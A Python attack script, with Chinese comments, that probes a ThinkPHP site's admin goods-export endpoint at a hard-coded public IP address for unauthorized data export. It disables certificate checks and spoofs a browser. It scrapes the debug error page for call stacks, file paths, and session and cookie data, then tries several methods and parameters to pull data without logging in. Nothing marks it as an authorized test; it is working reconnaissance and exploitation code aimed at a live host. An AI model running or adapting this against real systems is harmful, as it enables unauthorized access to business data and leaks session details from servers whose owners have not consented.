#!/usr/bin/env python3
"""tp_export_focus.py - 深挖Export/goodslist未授权执行"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "X-Requested-With": "XMLHttpRequest"}
BASE = "https://139.196.199.221"

def req(url, data=None, method=None, timeout=10):
    try:
        if data is not None:
            r = urllib.request.urlopen(urllib.request.Request(url, data=urllib.parse.urlencode(data).encode(),
                headers={**UA, "Content-Type": "application/x-www-form-urlencoded"}, method=method), timeout=timeout, context=ctx)
        else:
            r = urllib.request.urlopen(urllib.request.Request(url, headers=UA, method=method), timeout=timeout, context=ctx)
        return r.status, r.read(150000).decode("utf-8", "ignore"), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(150000).decode("utf-8", "ignore"), e.geturl()
    except Exception as e:
        return 0, repr(e)[:150], ""

print("=== 1. 500错误完整分析 ===", flush=True)
st, b, fu = req(BASE + "/admin/export/goodslist.html")
# 提取调用栈中的业务类
for m in re.finditer(r'<abbr title="([^"]+)"', b):
    pass
# 提取Application调用
apps = re.findall(r'at <abbr title="([^"]+)"[^>]*>([^<]+)</abbr>', b)
for cls, fn in apps[:15]:
    print("  CALL: %s::%s" % (cls, fn), flush=True)
# 看是否有业务文件名
files = re.findall(r'<a class="toggle" title="([^"]+)"', b)
for f in files[:10]:
    if "thinkphp/library" not in f:
        print("  FILE: %s" % f, flush=True)
# 环境变量里的POST/GET
for sec in ["GET Data", "POST Data", "Session", "Cookie"]:
    idx = b.find(sec)
    if idx > 0:
        seg = b[idx:idx+800]
        vals = re.findall(r'<strong>([^<]+)</strong>', seg)
        print("  %s: %s" % (sec, vals[:8]), flush=True)

print("\n=== 2. 不同方法/参数尝试 ===", flush=True)
tests = [
    ("GET", "/admin/export/goodslist.html", None),
    ("POST", "/admin/export/goodslist.html", {}),
    ("POST", "/admin/export/goodslist.html", {"type": "1"}),
    ("POST", "/admin/export/goodslist.html", {"page": "1", "limit": "100"}),
    ("POST", "/admin/export/goodslist.html", {"format": "excel"}),
    ("POST", "/admin/export/goodslist.html", {"download": "1"}),
    ("GET", "/admin/export/goodslist.html?type=1", None),
    ("POST", "/admin/Export/goodslist.html", {}),
    ("GET", "/admin/export/goodslist", None),
]
for method, p, d in tests:
    st, b, fu = req(BASE + p, d, method=method)
    # 判断响应类型
    ct = ""
    if "variable type error" in b:
        ct = "array-error(500)"
    elif "跳转提示" in b:
        ct = "login-redirect"
    elif st == 200 and len(b) > 200 and ("{" in b or "<table" in b or "excel" in b.lower()):
        ct = "*** DATA? ***"
    else:
        ct = "st=%d size=%d" % (st, len(b))
    print("  %s %s %s -> %s" % (method, p, d if d else "", ct), flush=True)
    if "DATA" in ct:
        print("    BODY HEAD: %s" % b[:400], flush=True)

print("\n=== 3. Response头检查(是否是文件下载) ===", flush=True)
import http.client, ssl as ssl2
conn = http.client.HTTPSConnection("139.196.199.221", timeout=10, context=ctx)
conn.request("POST", "/admin/export/goodslist.html", body=urllib.parse.urlencode({"type": "1"}),
             headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
r = conn.getresponse()
print("  status:", r.status)
print("  headers:", dict(r.headers))
conn.close()

print("=== DONE ===", flush=True)
